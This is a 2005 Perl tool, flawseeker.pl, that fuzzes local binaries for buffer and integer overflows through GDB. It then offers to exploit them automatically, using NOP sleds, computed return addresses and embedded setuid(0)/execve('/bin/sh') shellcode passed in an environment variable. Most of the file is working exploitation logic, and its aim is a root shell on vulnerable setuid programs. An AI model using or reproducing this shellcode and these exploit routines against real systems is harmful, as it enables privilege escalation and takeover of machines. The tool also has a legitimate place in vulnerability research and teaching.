#!/usr/bin/perl  
#  
# flawseeker.pl v3.0 (c) 2005 written by Carlos Carvalho
# 
# Description: 	.Binary debugger 
# 		.Overflow tracker
# 		.Exploitation tool 
# 
#
#              	flawseeker use GDB interaction to get  
#              	register addresses at overflow time. 
# 
#		Exploit function available for
#		type 1 (stack overflow) ,
#		type 2 (adjacent memory overflow) and
#		type 4 (integer overflow) only.
#
#		Perl modules Devel::GDB and Switch
#		are required. Install them from cpan.
#
#              	Try: ./flawseeker.pl -h 
# 	 
# Contact:  -=carloslack at gmail dot com=- 
#
# Greetz goes to: eniac, hexdump, Shorgen, kid gonzalez, codak, drk, ttaranto, setnf,
# 		  estevao, F-117, lewney
#  
# 
use strict; 
use Switch; 
use Devel::GDB; 
use Term::ANSIColor; 
 
my $version = "flawseeker.pl v3.0 by nutshell:\nBinary debugger\nOverflow tracker\nExploitation tool"; 
 
my $shellcode_01 = 	#setuid0 by hash
                  	"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80". 
                  	#execve /bin/sh 45 bytes 
                  	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88". 
                  	"\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3". 
                  	"\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31". 
                  	"\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff". 
                  	"\xff\xff/bin/sh"; 
 
my $string = "\x41"; 
my $buff = "$string"; 
my $space = "\x20"; 
my $sigsegv = 35584;  
my $barloop =0; 
my $bar = 0; 
my $i = 0; 
my $x = 0; 
my $simple = 0; 
my $counter = 1; 
my $debugeipcounter = 0; 
my $intcounter = -1073746000;  
my $intcounterend = 1073746000;  
my $inteip = "0xbfffff*"; 
my $logfile01 = "flaw_logW.log";
my $logfile02 = "flaw_log.log"; 
my $logging = "Off"; 
my $clear = `/usr/bin/clear`; 
 
my $ret = ""; 
my $firstsigsegv = ""; 
my $gdb = ""; 
my $blimit= ""; 
my $bugfile = ""; 
my $logfile = ""; 
my $logname = ""; 
my $adjstring = ""; 
my $adjlength = ""; 
my $output = ""; 
my $option = ""; 
my $option = ""; 
my $HACK = ""; 
my $envHACK = ""; 
my $execargs = ""; 
my $debug = ""; 
my $debugeip = ""; 
my $debugeipcounterlmt = "";  
my $debugeipinput = ""; 
my $enter = ""; 
my $counterlmt = "";  
my $date = ""; 
my $filename = ""; 
my $cmdargs = ""; 
my $bufferlimit = ""; 
my $ownopt = ""; 
my $intergerjoin = ""; 
my $adjacentbuff = ""; 
my $errlog = ""; 
my $status = ""; 
my $type = ""; 
my $CMD = ""; 
my $buffer = ""; 
my $return_addr = ""; 
my $nret = ""; 
 
sub exploit_stack() { 
$return_addr = 0xbffffffa - length($shellcode_01) - length($filename); 
$nret = pack('l', ($return_addr)); 
$x = $ret - 4; 
for ($i = 0 ; $i < $x ; $i++) { $buffer .= "\x90" }; 
$buffer .= "$nret"x6; 
local($ENV{'ENTER_SANDMAN'}) = $shellcode_01; 
system("$filename $buffer"); 
}

sub exploit_adjacent () {
$return_addr = 0xbffffffa - length($shellcode_01) - length($filename);
$nret = pack('l', ($return_addr));
$x = $ret - 4;
for ($i = 0 ; $i < $x ; $i++) { $buffer .= "\x90" };
$buffer .= "$nret"x6;
local($ENV{'ENTER_SANDMAN'}) = $shellcode_01;
system("$bugfile $CMD $adjstring $buffer");
}

sub exploit_integer() {
$buffer = "\x90"x5000;
$buffer .= $shellcode_01;
local($ENV{"HACK"}) = $buffer;
system("$filename $CMD $intcounter");
}
 
sub info1() { 
printf <<EOF 
       Filling up $bugfile`s buffer with 0x41 (A`s) 
       until we get SIGSEGV, if progress bar stop try ctrl+c.  
       Wait... 
EOF
} 
 
sub info2() { 
printf <<EOF 
       L4m0 integer overflow test. 
       Starting from $intcounter to $intcounterend. 
       We must have $inteip as \$eip address. 
       Wait...Go get a coffee :] 
EOF
} 
 
sub log1 () { 
       open(LOGCOMOM, ">>$logfile02") or die "$!\n"; 
       printf(LOGCOMOM "\n              -= $date =- \n"); 
       printf(LOGCOMOM "                   Tested file: $bugfile\n"); 
       printf(LOGCOMOM "                   Vulnerable type: $type\n"); 
       printf(LOGCOMOM "First SIGSEGV occurs at $firstsigsegv bytes.\n"); 
       printf(LOGCOMOM "At $ret bytes:\n"); 
       printf(LOGCOMOM "$output\n"); 
       close(LOGCOMOM); 
       printf("Log saved!\n"); 
       exit(0); 
 
} 

sub log2() { 
        open(LOGCOMOM, ">>$logfile02") or die "$!\n"; 
        printf(LOGCOMOM "\n              -= $date =- \n"); 
        printf(LOGCOMOM "                   Tested file: $bugfile\n"); 
        printf(LOGCOMOM "                   Vulnerable type: $type\n"); 
        printf(LOGCOMOM "$debugeip"); 
        printf(LOGCOMOM "Got \$esp address at value $intcounter\n"); 
        close(LOGCOMOM); 
        printf("Log saved!\n"); 
        exit(0); 
 
} 

sub log3() { 
	open(LOGCOMOM, ">>$logfile02") or die "$!\n"; 
	printf(LOGCOMOM "\n             -= $date =-\n"); 
	printf(LOGCOMOM "                  Tested file: $bugfile\n"); 
      printf(LOGCOMOM "                  Vulnerable type: $type\n"); 
	printf(LOGCOMOM "SIGSEGV occurs at $ret bytes.\n"); 
	close(LOGCOMOM); 
	printf("Log saved!\n"); 
} 

sub execmenu() { 
printf <<EOF 
-= flawseeker.pl v3.0 =- 
-= Coded by nuTshell =- 
 
Logging turned $logging  
[1] Filename [ $filename ] 
[2] Type [ $type ] 
[3] Command line arguments [ $cmdargs ] 
[4] Buffer Limit, default 1500 [ $bufferlimit ] 
[5] Adjacent buffer [ $adjacentbuff ] 
[6] Environment variable name [ $envHACK ] 
[7] Start:End integer value [ $intergerjoin ] 
 
EOF
} 

sub typemenu() {
printf <<EOF
Options:
1-> simple test *exploitation available*
2-> adjacent test *exploitation available*
3-> environment test (no dubugging)
4-> integer overflow test *exploitation available*
EOF
}

sub menu () { 
printf <<EOF 
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-  flawseeker.pl  +-+-+-+-+-+-+-+-+-+-+-+-+-+ 
         Coded by nuTshell  -=  carloslack\@gmail.com =-            
 
   Usage: $0 <ENTER> | [-h|-v|-lwo|-lo|-lall]   
   <ENTER>                 [run program with no args] 
   -h                      [this menu] 
   -v			   [version] 
   -lw			   [log WeIrD output] 
   -lo                     [log results output]  
   -lall		   [log WeIrD & results output] 
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 
EOF
} 
 
sub printbar() { 
$bar = $barloop + 1; 
$barloop++; 
if ($bar == 20) {printf("-") ; $bar = 0 ; $barloop = 0}; 
} 
 
sub cmdarg () { 
printf("Enter as many arguments as needed.\n"); 
printf("Each arg must be followed by <ENTER>\n"); 
printf("To finish just type \"exit\":\n"); 
chomp($CMD = <STDIN>) ; 
$CMD .= $space; 
	while ($CMD !~ /exit/) { 
               chomp($CMD .= <STDIN>) ; 
               $CMD .= $space; 
	} 
$CMD =~ s/exit//g; 
$cmdargs = $CMD; 
printf("$clear\n"); 
&execmenu; 
} 
 
if ("$ARGV[0]" eq "-h") {&menu and exit(0)} 
if ("$ARGV[0]" eq "-v") { 
	printf color("bold"); 
	printf "$version\n"; 
	printf color("reset"); 
	exit(0); 
}
if ("$ARGV[0]" eq "-lo") { 
	$logging = "On" 
}
if ("$ARGV[0]" eq "-lw" || "$ARGV[0]" eq "-lall") { 
      $logfile = ">> $logfile01 2>&1"; 
      $logname = $logfile; 
      $logname =~ s/2>&1//g; 
      printf color("bold"); 
      printf("\nWARNING:$space"); 
      printf color("reset"); 
      printf("Logging STDERR can generate\n"); 
      printf("big logfile depending on your test!\n"); 
      printf("Press any key\n\n"); 
      $logging = "On"; 
      $enter = <STDIN>; 
      printf("$clear\n"); 
} else {$logfile = ">/dev/null 2>&1"} 
 
&execmenu; 
printf("Filename> "); 
chomp($bugfile = <STDIN>) ; 

if (! -f $bugfile) {die "$bugfile $!\n"} 

$filename = $bugfile; 
printf("$clear\n"); 
&execmenu; 
&typemenu;
printf("Type [1|2|3|4]> "); 
chomp($option = <STDIN>) ; 

if ($option <= 0 || $option >= 5) { die "Invalid option\n" } 

$type = $option; 
printf("$clear\n"); 
&execmenu; 

switch($option) {      
        case "1" {  printf("Command line arguments y/N> "); 
		    chomp($execargs = <STDIN>) ; 
		    if ("$execargs" eq "y") {&cmdarg} 
	    } 
 
	case "2" { printf("Command line arguments y/N> "); 
		   chomp($execargs = <STDIN>) ; 
		   if ("$execargs" eq "y") {&cmdarg} 
		   printf("Adjacent buffer> "); 
		   chomp($adjlength = <STDIN>) ; 
	           $adjacentbuff = $adjlength; 
	           printf("$clear\n"); 
	           &execmenu; 
 
		   if(!$adjlength) {printf("Adjacent fixed buffer length REQUIRED! Try again.\n") ; exit(1)} 
 
		   $adjstring = "$string"x$adjlength; 
	    }  
 
	case "3" { printf("Command line arguments y/N> "); 
		   chomp($execargs = <STDIN>) ; 
 
		   if ("$execargs" eq "y") {&cmdarg} 
 
		   printf("Environment variable name> "); 
		   chomp($HACK = <STDIN>) ; 
                   if(!$HACK) { die "Environment name required!\n" } 
		   $envHACK = $HACK; 
	           printf("$clear\n"); 
		   &execmenu; 
	   } 
        case "4" { printf("Command line arguments y/N> "); 
		   chomp($execargs = <STDIN>);
 
		   if ("$execargs" eq "y") {&cmdarg} 
	    } 
} 
 
if ("$option" ne "4") { 
	printf("Buffer Limit [1500]> "); 
	chomp($blimit = <STDIN>) ; 
        $bufferlimit = $blimit; 
	printf("$clear\n"); 
	&execmenu; 
	if (!$blimit) {$blimit = 1500 ;  
			$bufferlimit = $blimit; 
			printf("$clear\n"); 
			&execmenu; 
		} 
 
} else { 
	$intergerjoin = join(":",$intcounter,$intcounterend); 
	printf("$clear\n"); 
	&execmenu; 
} 
 
if (!$bugfile || !$option) {&menu and exit(1)} 
if ("$option" eq "3") {if (!$HACK) {&menu and exit(0)}} 
 
sub exec() { 
 
if ("$option" eq "1") {$status = system("$bugfile $CMD $buff $logfile")} 
 
if ("$option" eq "2") {$status = system("$bugfile $CMD $adjstring $buff $logfile")} 
 
if ("$option" eq "3") {local($ENV{"$HACK"}) = $buff ;  
		       $status = system("$bugfile $CMD $logfile")} 
 
} 
 
 
sub run1 () { 
&info1 ; 
printf("["); 
while ($counter <= $blimit) { 
 
&exec; 
&printbar; 
 
$status != $sigsegv or $ret = $counter + 4 and printf("> Done!\n$bugfile is vulnerable at $counter bytes!\n") and last; 
 
  $buff .= "$string"; 
  $counter++; 
} 
if ($counter > $blimit) { 
  printf("> Done!\n$bugfile is not vulnerable at least until $blimit bytes\n"); 
} 
} 
if ("$option" eq "1" || "$option" eq "2" || "$option" eq "3" ) { &run1 } 
 
sub run2 () { 
&info2; 
 
$gdb = new Devel::GDB (-file => $bugfile ) ; 
 
for ($intcounter=$intcounter;$intcounter<=$intcounterend;$intcounter+=20) {  
 
$gdb -> get ( "r $CMD $intcounter" ); 
$debugeip = $gdb -> get ( "i r eip" ); 
 
if($debugeip =~ /$inteip/) {  
	printf("[--->Done!\n"); 
        $debugeip = $gdb -> get ( "i r esp ebp esi edi eip"); 
	printf("$debugeip");  
	printf("Got return address at value: $intcounter\n"); 
	last; 
}  
if($intcounter == $intcounterend) {printf("Sorry, no results.\n") ; exit(0)} 
 }	 
} 
 
switch($option) { 
 
case "1"   {  
 
  if($status == $sigsegv) {printf("Debug n/Y> "); 
  chomp($debug = <STDIN>) ; 
  if("$debug" eq "n") {exit(0)}} 
 
  $gdb = new Devel::GDB (-file => $bugfile ) ; 
  $debugeip = $gdb -> get ( "i r eip" ); 
  if($status != $sigsegv) {exit(1)} 
  if($debugeip =~ /0x42424242/) { 
    printf("\n[!] Status at $ret bytes:\n\n"); 
  } 
  $buff .= "\x42\x42\x42\x42"; 
  $firstsigsegv = (length($buff) - 4); 
  $gdb -> get ( "r $CMD $buff" ); 
  $debugeip = $gdb -> get ( "i r eip" ); 
  if($debugeip !~ /0x42424242/) { 
        printf("\$eip wasn`t overwritten."); 
        printf("\n[!] Status at $ret bytes:\n\n"); 
        printf("$debugeip\n"); 
        printf("Brute force to guess correct adresses n/Y> "); 
        chomp($debugeipinput = <STDIN>) ; 
        if("$debugeipinput" ne "n") { 
             printf("Max bytes size to increase buffer [20]> ");  
	     chomp($debugeipcounterlmt = <STDIN>) ; 
             if(!$debugeipcounterlmt) {$counterlmt = 20} else {$counterlmt = $debugeipcounterlmt} 
             while($debugeipcounter <= $counterlmt) { 
		     $buff .= "\x42"; 
                     $gdb -> get ( "r $CMD $buff" ); 
                     $debugeip = $gdb -> get ( "i r eip" ); 
                     $ret++; 
		     $debugeipcounter++; 
                     $debugeip !~ /0x42424242/ or last ; 
                     } 
               } 
   } 
 
  $output = $gdb -> get ( "i r esp ebp esi edi eip" ); 
  printf("\n[!] Status at $ret bytes:\n\n"); 
  printf("$output\n"); 
  	if ($debugeip =~ /0x42424242/) { 
	 	printf("Hmmm 0x42424242! Hack it y/N>"); 
	 	chomp($ownopt = <STDIN>) ; 
		&exploit_stack if ($ownopt eq "y"); 
  	} 
 
} 
 
case "2"  { 
 
   if($status == $sigsegv) {printf("Debug? [n/Y]:\n"); printf("> "); 
   chomp($debug = <STDIN>) ; 
   if("$debug" eq "n") {exit(0)}} 
   $gdb = new Devel::GDB (-file => $bugfile ) ; 
   $debugeip = $gdb -> get ( "i r eip" ); 
   if($status != $sigsegv) {exit(1)} 
   if($debugeip =~ /0x42424242/) { 
      printf("\n[!] Status at $ret bytes:\n\n"); 
   } 
   $buff .= "\x42\x42\x42\x42"; 
   $firstsigsegv = (length($buff) - 4); 
   $gdb -> get ( "r $CMD $adjstring $buff" ); 
   $debugeip = $gdb -> get ( "i r eip" ); 
   if($debugeip !~ /0x42424242/) { 
          printf("\$eip wasn`t overwritten."); 
          printf("\n[!] Status at $ret bytes:\n\n"); 
          printf("$debugeip\n"); 
          printf("Brute force to guess correct adresses n/Y> "); 
	  chomp($debugeipinput = <STDIN>) ; 
	  if("$debugeipinput" ne "n") { 
		printf("Max bytes size to increase buffer [20]> "); 
		chomp($debugeipcounterlmt = <STDIN>);
		if(!$debugeipcounterlmt) {$counterlmt = 19} else {$counterlmt = $debugeipcounterlmt} 
		while($debugeipcounter <= $counterlmt) { 
			$buff .= "\x42"; 
			$gdb -> get ( "r $CMD $adjstring $buff" ); 
			$debugeip = $gdb -> get ( "i r eip" ); 
			$ret++; 
		        $debugeipcounter++; 
			$debugeip !~ /0x42424242/ or last ; 
                 } 
            }  
   } 
   $output = $gdb -> get ( "i r esp ebp esi edi eip" ); 
   printf("\n[!] Status at $ret bytes:\n\n"); 
   printf("$output\n"); 
  	if ($debugeip =~ /0x42424242/) { 
	 	printf("Hmmm 0x42424242! Hack it y/N>"); 
	 	chomp($ownopt = <STDIN>) ; 
		&exploit_adjacent if ($ownopt eq "y"); 
  	} 
	} 
 
case "3" { 
 
   printf("Warning: Gdb calling does not support env-method untill now.\n"); 
   if ($status == $sigsegv) { 
   printf("With $ret bytes maybe is possible to control \$eip register.\n") 
         } 
     } 
 
case "4" { 
	&run2;
	if($debugeip =~ /$inteip/) {
	   printf("Hmmm 0xbfffff*! Hack it y/N>");
	   chomp($ownopt = <STDIN>) ; 
	   &exploit_integer if ($ownopt eq "y");
	
	}
      } 
} 
 
if("$ARGV[0]" eq "-lo" || "$ARGV[0]" eq "-lall") { 

	$date = localtime();     
 
switch($option) { 
       case "1" {&log1} 
       case "2" {&log1} 
       case "3" {&log3} 
       case "4" {&log2} 
	}  
 
} 
#eof 

